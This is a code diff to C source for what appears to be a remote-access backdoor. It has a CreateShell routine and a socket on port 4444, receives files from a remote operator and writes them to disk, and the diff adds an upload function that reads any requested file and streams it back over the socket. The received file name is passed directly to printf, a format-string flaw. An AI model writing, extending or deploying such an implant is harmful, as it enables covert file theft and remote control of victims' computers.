@@ -12,8 +12,6 @@
 void CreateShell(int port);
 int startup();
 void recieve();
-void auth();
-int findSize(char file_name[]);
 void upload();
 int port = 4444;
 SOCKET sockt; //global sockt
@@ -105,12 +103,12 @@ void recieve() {
 	char filename[DEFAULT_BUFLEN];
 	memset(filename, 0, sizeof(filename));
 	recv(sockt, filename, DEFAULT_BUFLEN, 0);
-	
-	//wait for binary flag
+	printf(filename);
+
+	//initialize buffer
 	unsigned char buffer[DEFAULT_BUFLEN];
 	memset(buffer, 0, sizeof(buffer));
-	printf(filename);
-	auth(); //1 byte ACK
+	auth(sockt); //1 byte ACK
 	
 	//find file size being sent
 	char tmp[10];
@@ -120,7 +118,7 @@ void recieve() {
 	recv(sockt, tmp, 10, 0); //gets 10 bytes
 	totalbytes = atoi(tmp);
 	printf(tmp);
-	auth();
+	auth(sockt);
 
 	FILE* ptr = fopen(filename, "wb"); //if buffer == B then write bytes else just write
 	int extra = (totalbytes % DEFAULT_BUFLEN);
@@ -129,6 +127,7 @@ void recieve() {
 	while (tmpbuff == NULL) //prevent tmpbuff being null
 		tmpbuff = malloc(extra * sizeof(char)); //makes tmpbuff size of remainder buff
 
+	memset(buffer, 0, sizeof(buffer)); //clean buffer
 	while (recvbytes < totalbytes) {
 		if (totalbytes - recvbytes < DEFAULT_BUFLEN) {
 			recv(sockt, tmpbuff, extra, MSG_WAITALL);
@@ -141,19 +140,46 @@ void recieve() {
 		recvbytes += bytesrecv;
 	}
 	fclose(ptr); //close file
-	auth();
+	auth(sockt);
 }
 void upload() {
 	char file_path[DEFAULT_BUFLEN] = { '\0' }; // ititialize to all zeros
 	recv(sockt, file_path, DEFAULT_BUFLEN, 0);
-	auth();
+	auth(sockt);
 
 	int size = findSize(file_path); //get filesize
 
+	char buffer[DEFAULT_BUFLEN] = { '\0' }; //create buffer for recieving
+
 	if (size != -1) {
-		char sizechar[8] = { '\0' };
+		char sizechar[10] = { '\0' };
 		sprintf(sizechar, "%d", size);
 		send(sockt, sizechar, sizeof(sizechar), 0); //send file size
+
+		int rec = recv(sockt, buffer, 2048, 0); //expecting one byte confirm
+
+		if (rec == 1) {
+			FILE* fp = fopen(file_path, "rb"); //read in bytes
+
+			int bytesread = 0; //total bytes of file read
+			int extra = (size % DEFAULT_BUFLEN);
+
+			char* tmpbuff = NULL;
+			while (tmpbuff == NULL) //prevent tmpbuff being null
+				tmpbuff = malloc(extra * sizeof(char)); //makes tmpbuff size of remainder buff
+
+			while (bytesread < size) {
+				if ((size - bytesread) < DEFAULT_BUFLEN) {
+					fread(tmpbuff, extra, 1, fp); //read in last amount of bytes
+					send(sockt, tmpbuff, extra, 0); //send final buffer then free the maloc
+					free(tmpbuff);
+					break;
+				}
+				fread(buffer, DEFAULT_BUFLEN, 1, fp);
+				send(sockt, buffer, DEFAULT_BUFLEN, 0); //send bytes
+				bytesread += DEFAULT_BUFLEN; //add amount sent to bytes total
+			}
+		}
 
 	}
 
